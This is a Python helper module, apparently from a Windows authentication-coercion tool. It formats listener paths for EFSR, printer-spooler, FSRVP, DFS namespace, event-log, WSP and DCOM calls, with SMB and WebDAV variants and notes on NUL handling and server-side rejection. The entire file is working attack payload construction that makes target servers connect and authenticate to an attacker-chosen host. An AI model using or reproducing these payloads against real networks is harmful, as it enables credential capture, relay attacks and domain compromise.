"""Listener path formatting per protocol and transport (SMB vs WebDAV)."""

import random
import string

_NUL = "\x00"


def _rnd(n=8):
    return "".join(random.choices(string.ascii_lowercase, k=n))


def efsr_path(listener, listener_port=445):
    """EFSR UNC path. WebDAV when port != 445."""
    if listener_port != 445:
        return f"\\\\{listener}@{listener_port}/{_rnd(3)}\\share\\file.txt{_NUL}"
    return f"\\\\{listener}\\test\\Settings.ini{_NUL}"


def rprn_path(listener, listener_port=445):
    """RPRN listener path. WebDAV when port != 445."""
    if listener_port != 445:
        return f"\\\\{listener}@{listener_port}/{_rnd(3)}{_NUL}"
    return f"\\\\{listener}{_NUL}"


def fsrvp_path(listener, listener_port=445):
    """FSRVP share path. WebDAV when port != 445."""
    if listener_port != 445:
        return f"\\\\{listener}@{listener_port}/{_rnd(3)}{_NUL}"
    return f"\\\\{listener}\\test{_NUL}"


def dfsnm_path(listener, listener_port=445):
    """DFSNM ServerName path. WebDAV when port != 445."""
    if listener_port != 445:
        return f"\\\\{listener}@{listener_port}/{_rnd(3)}\\share\\file.txt{_NUL}"
    return f"\\\\{listener}\\{_rnd()}\\file.txt{_NUL}"


def dfsnm_dfs_path(listener, listener_port=445):
    """DFSNM pDfsPath for AddRootTarget/RemoveRootTarget."""
    if listener_port != 445:
        return f"\\\\{listener}@{listener_port}/{_rnd(3)}{_NUL}"
    return f"\\\\{listener}\\a{_NUL}"


def even_path(listener, listener_port=445):
    """MS-EVEN BackupFileName. No trailing NUL: this field is an RPC_UNICODE_STRING
    (length-prefixed), not a WSTR, an embedded NUL makes the server reject the call
    with rpc_x_bad_stub_data before it even looks at the path. WebDAV when port != 445,
    untested syntax, nobody has tried a WebDAV @port host inside this device-path form before."""
    if listener_port != 445:
        return f"\\??\\UNC\\{listener}@{listener_port}\\{_rnd(3)}"
    return f"\\??\\UNC\\{listener}\\{_rnd()}\\aa"


def wsp_uri(listener):
    """WSP file:// URI. SMB only."""
    return f"file:////{listener}/share"


def dcom_unc(listener, listener_port=445):
    """DCOM UNC path with random share/filename. WebDAV when port != 445, untested,
    nobody has tried a WebDAV @port host for AddScanPackageService before."""
    share = "".join(random.choices(string.ascii_letters, k=4))
    fname = "".join(random.choices(string.ascii_letters, k=4))
    if listener_port != 445:
        return f"\\\\{listener}@{listener_port}\\{share}\\{fname}.txt"
    return f"\\\\{listener}\\{share}\\{fname}.txt"
